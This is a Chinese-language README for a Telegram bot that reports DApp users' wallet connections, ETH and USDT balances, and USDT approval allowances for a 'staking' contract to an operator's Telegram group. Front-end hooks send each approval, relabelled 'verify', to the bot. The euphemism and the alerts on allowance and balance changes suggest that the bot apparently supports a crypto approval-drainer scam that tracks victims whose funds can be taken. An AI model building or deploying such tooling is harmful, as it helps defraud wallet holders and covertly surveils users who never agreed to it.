# 📱 DApp Telegram监控机器人

一个功能强大的Telegram机器人，用于实时监控DApp用户的钱包连接状态、余额变化和verify状态。

## ✨ 功能特性

- 🔗 **实时用户监控** - 监控用户钱包连接和断开
- 💰 **余额跟踪** - 自动获取ETH和USDT余额
- 🔑 **verify状态监控** - 跟踪用户对智能合约的verify额度
- 📊 **详细报告** - 发送格式化的用户信息到Telegram群组
- 🚨 **状态变化通知** - 余额或verify发生重要变化时自动通知
- 📡 **Webhook集成** - 通过HTTP API接收前端事件
- 🤖 **丰富的Bot命令** - 支持多种Telegram命令操作

## 🚀 快速开始

### 1. 安装依赖

```bash
cd telegram-bot
npm install
```

### 2. 创建Telegram机器人

1. 与 [@BotFather](https://t.me/botfather) 对话
2. 发送 `/newbot` 命令
3. 按提示设置机器人名称和用户名
4. 保存返回的 `Bot Token`

### 3. 获取群组Chat ID

1. 将机器人添加到目标群组
2. 发送一条消息到群组
3. 访问：`https://api.telegram.org/bot<YourBOTToken>/getUpdates`
4. 找到 `"chat":{"id": 负数ID}` 并保存

### 4. 配置环境变量

复制并编辑配置文件：

```bash
cp .env.example .env
```

```env
# Telegram配置
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=-1001234567890

# 区块链配置
ETH_RPC_URL=https://ethereum.publicnode.com
USDT_CONTRACT_ADDRESS=0xdAC17F958D2ee523a2206206994597C13D831ec7
STAKING_CONTRACT_ADDRESS=0x9773a5279603CE262e48bfE3be50033a98c0842F

# 监控配置
MONITOR_INTERVAL=30000
WEBHOOK_PORT=3001
```

### 5. 启动机器人

```bash
# 开发模式
npm run dev

# 生产模式
npm start
```

## 📡 API接口

### Webhook接口

#### 用户连接事件
```bash
POST /webhook/user-connect
Content-Type: application/json

{
  "address": "0x1234...5678",
  "action": "connect"  // 或 "authorize"
}
```

#### 用户断开事件
```bash
POST /webhook/user-disconnect
Content-Type: application/json

{
  "address": "0x1234...5678"
}
```

### 管理接口

#### 获取机器人状态
```bash
GET /api/status
```

#### 强制更新用户信息
```bash
POST /api/force-update
Content-Type: application/json

{
  "address": "0x1234...5678"  // 可选，不提供则更新所有用户
}
```

## 🤖 Telegram命令

| 命令 | 功能 |
|------|------|
| `/start` | 启动机器人并显示欢迎信息 |
| `/status` | 查看当前监控状态 |
| `/users` | 查看已连接用户列表 |
| `/help` | 显示帮助信息 |

## 🔌 前端集成

### 基本集成

```javascript
// 1. 引入集成代码
const TelegramBotIntegration = require('./telegram-bot/frontend-integration.js');

// 2. 初始化
const telegramBot = new TelegramBotIntegration('http://your-server:3001');

// 3. 在钱包连接时调用
async function onWalletConnect(address) {
  await telegramBot.notifyUserConnect(address, 'connect');
}

// 4. 在用户verify时调用
async function onUserAuthorize(address) {
  await telegramBot.notifyUserConnect(address, 'authorize');
}

// 5. 在钱包断开时调用
async function onWalletDisconnect(address) {
  await telegramBot.notifyUserDisconnect(address);
}
```

### React Hook集成

```javascript
// 在 useEffect 中监听钱包状态
useEffect(() => {
  if (isConnected && address) {
    telegramBot.notifyUserConnect(address, 'connect');
  } else if (!isConnected && address) {
    telegramBot.notifyUserDisconnect(address);
  }
}, [isConnected, address]);

// 在verify成功后调用
const handleApprove = async () => {
  try {
    const txHash = await approveUsdt(amount);
    await telegramBot.notifyUserConnect(address, 'authorize');
  } catch (error) {
    console.error('verify失败:', error);
  }
};
```

## 📊 监控数据

机器人会监控以下信息：

- **👤 钱包地址** - 用户的以太坊地址
- **💰 ETH余额** - 实时ETH余额
- **💵 USDT余额** - 实时USDT余额
- **🔑 verify额度** - 对质押合约的USDTverify额度
- **⏰ 时间戳** - 最后更新时间

## 🚨 通知类型

- **🔗 新用户连接** - 用户首次连接钱包
- **🔑 verify更新** - 用户verify额度发生变化
- **📊 余额变化** - ETH或USDT余额有重要变化
- **🔌 用户断开** - 用户断开钱包连接

## 🛠️ 配置选项

| 环境变量 | 默认值 | 说明 |
|----------|--------|------|
| `MONITOR_INTERVAL` | 30000 | 监控间隔(毫秒) |
| `MAX_RETRIES` | 3 | API重试次数 |
| `WEBHOOK_PORT` | 3001 | Webhook服务端口 |

## 🔒 安全考虑

- ✅ 机器人只读取公开的区块链数据
- ✅ 不存储或传输私钥信息
- ✅ 使用HTTPS进行数据传输(建议)
- ✅ 支持IP白名单限制(生产环境建议)

## 🚀 部署到生产环境

### 使用PM2部署

```bash
# 安装PM2
npm install -g pm2

# 启动机器人
pm2 start index.js --name "dapp-telegram-bot"

# 设置开机自启
pm2 startup
pm2 save
```

### 使用Docker部署

```dockerfile
# Dockerfile
FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm install --production

COPY . .

EXPOSE 3001

CMD ["npm", "start"]
```

```bash
# 构建和运行
docker build -t dapp-telegram-bot .
docker run -d --name telegram-bot -p 3001:3001 --env-file .env dapp-telegram-bot
```

## 📈 监控和日志

机器人提供详细的日志输出：

- ✅ 用户连接/断开事件
- 📊 区块链数据获取状态
- 📱 Telegram消息发送状态
- ❌ 错误和异常处理

## 🆘 故障排除

### 常见问题

1. **机器人无法发送消息**
   - 检查 `TELEGRAM_BOT_TOKEN` 是否正确
   - 确认机器人已添加到目标群组
   - 验证 `TELEGRAM_CHAT_ID` 格式(负数)

2. **无法获取用户余额**
   - 检查 `ETH_RPC_URL` 是否可访问
   - 验证合约地址是否正确
   - 确认网络连接正常

3. **Webhook不响应**
   - 检查端口是否被占用
   - 验证防火墙设置
   - 确认前端URL配置正确

## 📞 技术支持

如需技术支持或功能建议，请：

1. 查看日志输出获取错误信息
2. 检查网络和配置设置
3. 验证所有环境变量正确设置

---

**🎉 现在您可以实时监控DApp用户的所有活动！**



